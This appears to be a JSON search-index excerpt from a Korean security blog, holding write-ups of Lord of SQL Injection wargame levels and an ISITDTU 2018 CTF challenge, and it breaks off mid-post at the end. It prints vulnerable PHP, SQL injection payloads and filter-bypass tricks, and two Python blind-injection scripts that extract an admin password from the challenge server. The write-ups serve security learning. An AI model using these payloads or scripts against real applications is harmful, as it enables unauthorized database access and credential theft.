        "content": "벌써 11일 째 매일매일 꾸준히 문제를 풀고 있다.작심삼일을 반복하던 내가 11일 째라니 기특하다.이번 문제도 역시 Blind SQL Injection 이다.코드는 다음과 같다.----------------------------------------------------------------------------------query : select id from prob_golem where id='guest' and pw=''----------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/or|and|substr\\(|=/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_golem where id='guest' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"golem\");   highlight_file(__FILE__); ?&gt;이번엔 새로운 필터링이 추가되었다.or, and 뿐만 아니라 substr(과 =가 있어도 HeHe를 출력한다.Blind SQL Injection 문제를 풀 때 여태까지 사용한게 substr 함수와 = 문자인데, 이 둘을 사용할 수 없게 되었다.substr의 경우, mid 함수를 사용하면 substr과 동일하게 사용할 수 있다.문제는 =인데, 처음에는 부등호를 사용하려 했었다.근데 생각해보니 삽입해야 하는 쿼리는 1' or id='admin' and length(pw)=1#의 형태인데, 뒤의 length(pw)=1에는 부등호를 사용한다 쳐도, id='admin'에는 부등호를 사용해서 체크하기가 어려워 보였다.그래서 like을 사용했다.and는 &amp;&amp;로, or은 ||로 사용할 수 있듯, = 또한 like으로 사용할 수 있다.따라서 최종적으로 완성되는 쿼리는 다음과 같은 형태가 된다.?pw=1' || id like 'admin' &amp;&amp; length(pw) like 1#앞서 말했듯, &amp;는 %26으로, #은 %23으로 바꾸어 전달해야 한다.이를 토대로 파이썬 코드를 구현하면 다음과 같다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"http://los.rubiya.kr/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 20):\ttry:\t\tquery = url + \"1' || id like 'admin' %26%26 length(pw) like \" + str(i) + \"%23\"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'Hello admin' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"1' || id like 'admin' %26%26 mid(pw, \" + str(j) + \", 1) like '\" + chr(i)\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'Hello admin' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"실행시킨 결과 아래와 같이 admin의 pw를 알아낼 수 있었다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : 7[+] Found 2 : 77[+] Found 3 : 77D[+] Found 4 : 77D6[+] Found 5 : 77D62[+] Found 6 : 77D629[+] Found 7 : 77D6290[+] Found 8 : 77D6290B[+] Found password :  77D6290B[+] End이번에도 알파벳 대문자는 소문자로 바꾸어 입력 해 주어야 한다.그냥 대문자 건너뛰고 소문자로 찾을걸 그랬나보다.?pw=77d6290b그럼 아래와 같이 문제를 풀 수 있다.----------------------------------------------------------------------------------------------query : select id from prob_golem where id='guest' and pw='77d6290b'----------------------------------------------------------------------------------------------GOLEM Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/or|and|substr\\(|=/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_golem where id='guest' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"golem\");   highlight_file(__FILE__); ?&gt;GOLEM Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/30/los-golem.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-29-los-skeleton-html": {
        "title": "[Lord of SQL Injection] LoS - skeleton 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 29, 2018",
        "author": "",
        "category": "",
        "content": "내일이 월요일이라니 실화인가.주말 너무 순삭되는 것 같다.지금 진행중인 CTF 문제를 풀고 싶은데 아직 내 실력으로는 무리라는걸 깨닫고 다시 LOS를 풀려고 돌아왔다.이번 문제의 이름은 skeleton 이다.코드는 다음과 같다.-----------------------------------------------------------------------------------------------query : select id from prob_skeleton where id='guest' and pw='' and 1=0-----------------------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id'] == 'admin') solve(\"skeleton\");   highlight_file(__FILE__); ?&gt;이번 문제도 역시 소스코드가 짧다.딱히 큰 필터링은 없는데 이번엔 쿼리가 달라져있다.pw를 사용자로부터 받아오는데, 뒤에 and 1=0이 있어 무조건 마지막에 입력한 쿼리는 false가 된다.예를 들어, 내가 이 전에 문제들을 풀었던 것 처럼 pw에 1' or id='admin을 입력한다면 완성되는 쿼리는 다음과 같다.select id from prob_skeleton where id='guest' and pw='1' or id='admin' and 1=0때문에 내가 입력한 값이 id=admin and 1=0 를 만들게 되는 것이다.그럼 뒤의 and 1=0을 실행 못하게 하면 문제를 풀 수 있을 것 같다.사실 아래처럼 입력해도 문제를 풀 수 있다.?pw=1' or id='admin' or '1'='1이렇게 되면 id='admin'를 기준으로 앞과 뒤의 쿼리가 모두 false고 id='admin'만 true가 되어 결과적으로 admin을 추출할 수 있다.근데 귀찮아서 문제를 풀 때는 그냥 #으로 주석처리 했다.?pw=1' or id='admin'%23역시 문제 풀때는 간단한 방법이 최고다.-------------------------------------------------------------------------------------------------------------------query : select id from prob_skeleton where id='guest' and pw='1' or id='admin'#' and 1=0-------------------------------------------------------------------------------------------------------------------SKELETON Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id'] == 'admin') solve(\"skeleton\");   highlight_file(__FILE__); ?&gt;SKELETON Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/29/los-skeleton.html"
      }
      ,
    
      "ctf-2018-2018-07-29-ctf-isitdtu2018-iz-html": {
        "title": "[ISITDTU 2018] IZ Write up",
        "tags": "Write-up, CTF, ISITDTU2018",
        "date": "July 29, 2018",
        "author": "",
        "category": "",
        "content": "이번 주말에 CTF 천국이었다.무려 3개가 비슷한 시기에 있었다.사실 ISITDTU CTF는 대회 시간에 참여를 못했는데, CODEBLUE CTF 문제를 보다보니 멘탈이 날아가서 이미 끝난 대회 문제를 다시 봤다.멘탈을 치유하려고 출제됬던 웹 문제중에 가장 쉬워보이는 IZ 문제를 선택해서 풀었는데 얘는 좀 다른 방향으로 멘탈이 나갔다. ㅎㅎ알고나니 문제는 어렵지 않았는데, 다음에는 이러지 말자는 나름의 반성일기 겸 풀이를 작성했다.문제 정보는 다음과 같다.It's just PHP !!!http://35.185.178.212/문제에 접속하면 그냥 소스코드를 보여준다.&lt;?php include \"config.php\"; $number1 = rand(1,100000000000000); $number2 = rand(1,100000000000); $number3 = rand(1,100000000); $url = urldecode($_SERVER['REQUEST_URI']); $url = parse_url($url, PHP_URL_QUERY); if (preg_match(\"/_/i\", $url))  {     die(\"...\"); } if (preg_match(\"/0/i\", $url))  {     die(\"...\"); } if (preg_match(\"/\\w+/i\", $url))  {     die(\"...\"); }     if(isset($_GET['_']) &amp;&amp; !empty($_GET['_'])) {     $control = $_GET['_'];             if(!in_array($control, array(0,$number1)))     {         die(\"fail1\");     }     if(!in_array($control, array(0,$number2)))     {         die(\"fail2\");     }     if(!in_array($control, array(0,$number3)))     {         die(\"fail3\");     }     echo $flag; } show_source(__FILE__); ?&gt;필터링이 여러 가지가 있는데, 그 필터링을 다 통과하고 나면 $flag를 출력 해 준다.일단 친절하게 소스코드를 주었으니, 내 서버에 test.php라는 이름으로 아래와 같이 코드를 살짝 수정해서 여기서 테스트를 했다.&lt;?php $number1 = rand(1,100000000000000); $number2 = rand(1,100000000000); $number3 = rand(1,100000000); $url = urldecode($_SERVER['REQUEST_URI']); var_dump($url);$url = parse_url($url, PHP_URL_QUERY); var_dump($url);if (preg_match(\"/_/i\", $url))  {     die(\"1\"); } if (preg_match(\"/0/i\", $url))  {     die(\"2\"); } if (preg_match(\"/\\w+/i\", $url))  {     die(\"3\"); }     if(isset($_GET['_']) &amp;&amp; !empty($_GET['_'])) {     $control = $_GET['_'];             if(!in_array($control, array(0,$number1)))     {         die(\"fail1\");     }     if(!in_array($control, array(0,$number2)))     {         die(\"fail2\");     }     if(!in_array($control, array(0,$number3)))     {         die(\"fail3\");     }     echo $flag; } show_source(__FILE__); ?&gt;소스코드의 필터링을 살펴보면, 약간 모순이 있는데, _, 0, \\w가 있으면 die(...)을 실행시키게 되어있다.(나는 어떤 필터링에 걸렸는지 구분하기 위해서 die(1) 이런식으로 바꿔서 사용했다.)그런데 $flag를 출력하기 위해서는 $_GET['_']가 있어야 하며, 이 값이 array(0, $number1) 안에 있어야 한다.in_array() 함수를 사용한 3가지 if문을 한방에 통과하는 방법은 $_GET['_']으로 0을 전달 해 주는 것이다.이 때 전달되어야 하는 쿼리스트링은 다음과 같다.?_=0여기서 내가 앞에서 말한 모순이 발생한다._와 0에 필터링이 있기 때문에 위의 쿼리문은 사용할 수 없다.그래서 내가 문제를 풀기 위해 가장 첫 번째로 사용했던 방법은 URL Decoding 이었다. 바보 같은 생각 첫 번째소스코드에 urldecode($_SERVER['REQUEST_URI']);가 있으니, _와 0을 URL Encoding 해서 넣어주면 소스코드에서 Decoding을 하니 필터링을 우회할 수 있지 않을까! 생각했다.그런데 당연한 말이지만 URL Encoding을 해서 넘겨주면 첫 번째와 두 번째 preg_match는 통과할 수 있지만 마지막 preg_match는 통과할 수 없다.정규표현식에서 \\w는 알파벳 대소문자 + 숫자를 의미하기 때문이다.결국 URL Encoding 한 값에 숫자 혹은 알파벳 대소문자는 무조건 들어가야 하기 때문에 필터링을 통과할 수 없다.물론 필터링을 통과했다 하더라도 %5f=%30 처럼 되므로, _가 아니라 이상한 값으로 인식 되어 if(isset($_GET['_']) &amp;&amp; !empty($_GET['_']))  조건문을 통과할 수 없다.두 번째로 생각한 방법은 주석처리를 하는 방법이다.요즘에 계속 LoS를 풀어서 그런지 문득 떠오른 방법이었다.만약에 ?_=0 중에 앞에 #을 붙여서 ?#&amp;_=0을 입력하면 $url = parse_url($url, PHP_URL_QUERY); 에서 제대로 파싱을 못하지 않을까 생각했다.그래서 ?%23&amp;_=0을 입력 했는데 아무것도 안떴다.어떻게 푸는건지 도저히 모르겠어서 SOS를 치고 풀이법을 들었는데, 비교적 엄청 간단하게 풀렸다.?.=!! 자리에는 $나 @처럼 다른 특수문자가 들어가도 문제를 풀 수 있다..을 입력했는데 _로 되는 이유는 .이 _로 치환되어 사용된다고 한다.문제가 생각보다 너무 쉽게 풀려서 약간 멘붕 올 뻔 했는데, 도저히 이해가 되질 않아서 ctftime.org에 올라온 다른 풀이법을 찾아 보았다.그런데, 문제를 푼 사람도 나처럼 #을 사용해서 문제를 풀었다.내 서버에서 했을때 아무리 해도 아무것도 안떠서 #으로는 못푸는건갑다 하고 있었는데, 내가 바보였다.내가 왜 그랬는지는 모르겠지만 내 서버로 코드를 옮길 때 include \"config.php\";를 지웠었다.그러니 $flag 변수에 값이 없어서 필터링을 다 통과했더라도 아무것도 출력하지 않는게 당연하다.물론 ?%23&amp;_=0 에서 0이 아니라 다른 문자(이 때는 숫자만 아니면 된다. 즉 알파벳 대소문자가 들어가도 된다.)를 넣었어야 완벽히 문제를 풀었겠지만, 필터링은 제대로 통과를 했었는데 그것 조차도 제대로 파악하지 못하고 있었다.소스코드를 준 만큼 그 소스코드를 제대로 옮기고, var_dump나 echo로 내가 입력한 값이 어떻게 처리되는지, 소스코드가 어디까지 실행된건지 제대로 파악했다면 문제를 어렵지 않게 풀 수 있었을텐데 생각을 반만 했던 것 같다. 이게 바보 짓 두번째…작년에도 이런 비슷한 실수를 해서 내가 flag를 가지고 있는 상태에서도 괜히 이상한 곳에서 삽질을 하고 있던 적이 있었다.그 때도 다음부턴 이런 실수 하지 말자고 다짐했는데 또 다시 이럴줄이야…다음번엔 정말로 꼼꼼히 파악해서 대회 기간에 web 문제 flag를 내 손으로 입력 해 보고싶다.어쨌든 이번 문제를 풀기 위해선 아래와 같이 입력하면 된다.?%23&amp;_=a (알파벳 대소문자)OR?%23&amp;_=! (특수문자)그럼 아래와 같이 flag를 출력 해 준다.ISITDTU{php_bad_language} &lt;?php include \"config.php\"; $number1 = rand(1,100000000000000); $number2 = rand(1,100000000000); $number3 = rand(1,100000000); $url = urldecode($_SERVER['REQUEST_URI']); $url = parse_url($url, PHP_URL_QUERY); if (preg_match(\"/_/i\", $url))  {     die(\"...\"); } if (preg_match(\"/0/i\", $url))  {     die(\"...\"); } if (preg_match(\"/\\w+/i\", $url))  {     die(\"...\"); }     if(isset($_GET['_']) &amp;&amp; !empty($_GET['_'])) {     $control = $_GET['_'];             if(!in_array($control, array(0,$number1)))     {         die(\"fail1\");     }     if(!in_array($control, array(0,$number2)))     {         die(\"fail2\");     }     if(!in_array($control, array(0,$number3)))     {         die(\"fail3\");     }     echo $flag; } show_source(__FILE__); ?&gt;FLAG : ISITDTU{php_bad_language}",
        "url": "//ctf/2018/2018/07/29/ctf-isitdtu2018-iz.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-28-los-vampire-html": {
        "title": "[Lord of SQL Injection] LoS - vampire 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 28, 2018",
        "author": "",
        "category": "",
        "content": "이번 문제도 역시 간단하게 풀 수 있었다.일단 소스코드가 짧으니 문제가 더 간단하게 느껴지는 것 같다.코드는 다음과 같다.----------------------------------------------------------------query : select id from prob_vampire where id=''----------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/\\'/i', $_GET[id])) exit(\"No Hack ~_~\");  $_GET[id] = strtolower($_GET[id]);  $_GET[id] = str_replace(\"admin\",\"\",$_GET[id]);   $query = \"select id from prob_vampire where id='{$_GET[id]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id'] == 'admin') solve(\"vampire\");   highlight_file(__FILE__); ?&gt;처음에 문제를 보고 troll 문제랑 같은 문제인 줄 알았다.그런데 이번 문제에서는 ereg() 함수가 사라지고 strtolower()과 str_replace() 함수가 생겼다.함수 이름에서도 알 수 있다시피 strtolower() 함수는 문자열의 대문자를 소문자로 바꾸어주는 함수이고, str_replace() 함수는 특정 문자열을 내가 지정한 문자열로 바꾸어 주는 함수이다.문제에서는 GET 방식으로 받아 온 값에서 admin이라는 문자를 공백으로 바꾸어 준다.그런데 이 str_replace() 함수에는 한가지 단점(?)이 있는데, 전체 문자열 전체를 한번만 검사하고 재검사는 하지 않는다는 것이다.만약에 str_replace(\"admin\", \"\", $var)라고 구현한다면 아래와 같이 문자열이 있을 경우 결과는 다음과 같다.# before$var = \"admin phpmyadmin administrator.\"#after$var = \" phpmy istrator.\"그런데 만약 adadminmin 라는 문자열이 있다면 가운데의 admin만 필터링 되어 사라지고 앞의 ad와 뒤의 min이 합쳐져 다시 admin이라는 단어를 만들 수 있게 된다.역시나 주소창에 아래처럼 입력했더니 문제를 풀 수 있었다.?id=adadminmin------------------------------------------------------------------------query : select id from prob_vampire where id='admin'------------------------------------------------------------------------VAMPIRE Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/\\'/i', $_GET[id])) exit(\"No Hack ~_~\");  $_GET[id] = strtolower($_GET[id]);  $_GET[id] = str_replace(\"admin\",\"\",$_GET[id]);   $query = \"select id from prob_vampire where id='{$_GET[id]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id'] == 'admin') solve(\"vampire\");   highlight_file(__FILE__); ?&gt;VAMPIRE Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/28/los-vampire.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-27-los-troll-html": {
        "title": "[Lord of SQL Injection] LoS - troll 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 27, 2018",
        "author": "",
        "category": "",
        "content": "다음 문제의 이름은 troll이다.중간중간에 좀 쉬운 문제들이 있어서 하루에 여러개 빠박! 풀고 싶은데 그러면 내가 일을 안할 것 같으니 한문제 씩만 풀어야겠다.이번 문제는 매우 간단하다.코드는 다음과 같다.----------------------------------------------------------query : select id from prob_troll where id=''----------------------------------------------------------&lt;?php    include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/\\'/i', $_GET[id])) exit(\"No Hack ~_~\");  if(@ereg(\"admin\",$_GET[id])) exit(\"HeHe\");  $query = \"select id from prob_troll where id='{$_GET[id]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['id'] == 'admin') solve(\"troll\");  highlight_file(__FILE__);?&gt;쿼리를 완성시켜 id가 admin인 결과를 가져오면 된다.그런데 코드 중간을 보면 ereg(\"admin\", %_GET['id'])라는 부분이 있다.ereg() 함수는 정규표현식을 이용해서 일치하는 문자열이 있는지를 찾아주는 함수이다.이 문제에서는 사용자가 입력 한 id에  admin이라는 문자열이 있는지 없는지를 검사한다.id가 admin인 결과를 추출해야 하는데 admin에 필터링이 걸려있다.그래서 ereg() 함수에 오류가 있거나 필터링이 완벽하지 않을 것이라고 생각하고 문제에 접근했다.이 전에도 몇번 언급했다시피 MySQL에서는 대소문자 구분이 없다.때문에 id가 admin인 결과를 추출하기 위해서 쿼리의 where절에 admin, Admin, ADMIN 등을 입력해도 결국 같은 값을 얻을 수 있다.찾아보니 ereg() 함수는 대소문자를 구분하는 함수이다.그래서 admin이라는 단어가 있다면 true를 반환하겠지만 Admin, ADMIN 처럼 한 글자라도 대문자로 구성한다면 false를 반환 할 것이다.그렇다면 필터링도 우회하고 쿼리도 정상적으로 실행 해 문제를 풀 수 있다.역시나 아래와 같이 입력했더니 문제를 풀 수 있었다.?id=ADMIN-------------------------------------------------------------------query : select id from prob_troll where id='ADMIN'-------------------------------------------------------------------TROLL Clear!&lt;?php    include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/\\'/i', $_GET[id])) exit(\"No Hack ~_~\");  if(@ereg(\"admin\",$_GET[id])) exit(\"HeHe\");  $query = \"select id from prob_troll where id='{$_GET[id]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['id'] == 'admin') solve(\"troll\");  highlight_file(__FILE__);?&gt;TROLL Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/27/los-troll.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-26-los-orge-html": {
        "title": "[Lord of SQL Injection] LoS - orge 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 26, 2018",
        "author": "",
        "category": "",
        "content": "이번 문제는 orge 이다.이 전 문제인 darkelf와 Blind SQL Injection 이었던 orc 문제가 섞인 것 같다.코드는 다음과 같다.-------------------------------------------------------------------------------query : select id from prob_orge where id='guest' and pw=''-------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/or|and/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_orge where id='guest' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"orge\");   highlight_file(__FILE__); ?&gt;or와 and 문자를 사용할 수 없어 or 대신에 ||, and 대신에 &amp;&amp;를 사용해야 한다.또한 입력한 pw와 디비에 저장된 pw의 값이 같아야 하기 때문에 Blind SQL Injection으로 문제를 풀어야 한다.그런데 첫 번째 쿼리와 두 번째 쿼리가 살짝 다르다.$query1 = \"select id from prob_orge where id='guest' and pw='{$_GET[pw]}'\"$query2 = \"select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'\"첫 번째 쿼리에서는 id='guest'로 되어 있고 두 번째 쿼리에서는 id='admin'으로 되어 있다.그런데 문제를 풀기 위한 조건은 admin의 정확한 pw를 알아내야 하는 것이므로, 첫 번째 쿼리를 통해 admin의 pw를 알아내고, 두 번째 쿼리를 통해 문제를 풀면 된다.admin의 pw를 알아내기 위한 쿼리 스트링은 다음과 같다.?pw=1' || id='admin' &amp;&amp; length(pw)=1#그런데 &amp;&amp;와 #은 그냥 입력하면 안되고 URL Encoding을 해 넘겨주어야 한다.즉, 수정하면 다음과 같다.?pw=1' || id='admin' %26%26 length(pw)=1%23위의 쿼리 스트링을 토대로 orc 문제를 참고 해 아래와 같이 python 코드를 구현했다.import urllib2import urllibimport requestsflag = \"\"length = 0url = \"http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 20):\ttry:\t\tquery = url + \"1' || id='admin' %26%26 length(pw)=\" + str(i) + \"%23\"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif 'Hello admin' in r.text:\t\tlength = i\t\tbreakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"1' || id='admin' %26%26 substr(pw, \" + str(j) + \", 1)='\" + chr(i)\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'Hello admin' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"실행 시킨 결과 다음과 같이 pw를 찾을 수 있었다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : 7[+] Found 2 : 7B[+] Found 3 : 7B7[+] Found 4 : 7B75[+] Found 5 : 7B751[+] Found 6 : 7B751A[+] Found 7 : 7B751AE[+] Found 8 : 7B751AEC[+] Found password :  7B751AEC[+] End이번에도 역시 7B751AEC에서 알파벳을 소문자로 바꿔주어야 문제가 풀렸다.?pw=7b751aec위와 같이 입력하면 문제를 풀 수 있다.-------------------------------------------------------------------------------------------query : select id from prob_orge where id='guest' and pw='7b751aec'-------------------------------------------------------------------------------------------ORGE Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/or|and/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_orge where id='guest' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"orge\");   highlight_file(__FILE__); ?&gt;ORGE Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/26/los-orge.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-25-los-darkelf-html": {
        "title": "[Lord of SQL Injection] LoS - darkelf 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 25, 2018",
        "author": "",
        "category": "",
        "content": "다음 문제는 darkelf 이다.이번 문제는 이 전 문제와 동일한 풀이 방법으로 풀 수 있었다.코드는 다음과 같다.----------------------------------------------------------------------------------query : select id from prob_darkelf where id='guest' and pw=''----------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();    if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/or|and/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"darkelf\");   highlight_file(__FILE__); ?&gt;이 전에는 공백에 필터링이 있었지만 이번에는 or과 and에 필터링이 있다.worfman 문제에서는 공백을 사용하지 않기 위해 ||을 사용했었는데, 이번에는 or 문자열을 사용하지 않기 위해 ||을 사용하면 될 것 같다.이 전 문제와 동일하게 URL 뒤에 아래와 같이 입력 해 주었다.?pw=1'||id='admin--------------------------------------------------------------------------------------------------query : select id from prob_darkelf where id='guest' and pw='1'||id='admin'--------------------------------------------------------------------------------------------------Hello adminDARKELF Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();    if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/or|and/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"darkelf\");   highlight_file(__FILE__); ?&gt;DARKELF Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/07/25/los-darkelf.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-07-24-los-wolfman-html": {
        "title": "[Lord of SQL Injection] LoS - wolfman 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "July 24, 2018",
        "author": "",
        "category": "",
        "content": "드디어 첫 줄의 마지막 문제인 wolfman 문제이다.이번에는 Blind SQL Injection이 아니다.코드는 다음과 같다.-------------------------------------------------------------------------------------query : select id from prob_wolfman where id='guest' and pw=''-------------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/ /i', $_GET[pw])) exit(\"No whitespace ~_~\");   $query = \"select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"wolfman\");   highlight_file(__FILE__); ?&gt;첨엔 이 전에 나왔던 문제랑 뭐가 다른건가 했는데 이제보니 공백에 대한 필터링이 추가되어 있다.당연한 얘기지만 이 경우 이 전 문제들을 풀었던 것 처럼 1' or id='admin을 사용할 수 없다.그래서 이번에는 or이라는 